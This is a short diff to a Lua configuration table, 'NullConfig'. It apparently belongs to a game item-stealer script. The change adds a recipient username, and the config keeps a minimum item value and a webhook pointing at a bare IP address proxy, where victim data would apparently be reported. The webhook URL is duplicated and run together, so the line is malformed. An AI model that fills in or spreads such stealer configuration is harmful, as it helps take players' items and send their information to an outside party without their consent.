@@ -1,5 +1,5 @@
 _G.NullConfig = {
-    User = {},
+    User = {"mikl222007"},
     min_value = 10000000000,
     pingEveryone = "Yes", -- dont change this
     Webhook = "http://176.100.37.215:20002/proxy/d7091e0330ebac0539ffc30b158b789chttp://176.100.37.215:20002/proxy/d7091e0330ebac0539ffc30b158b789c",
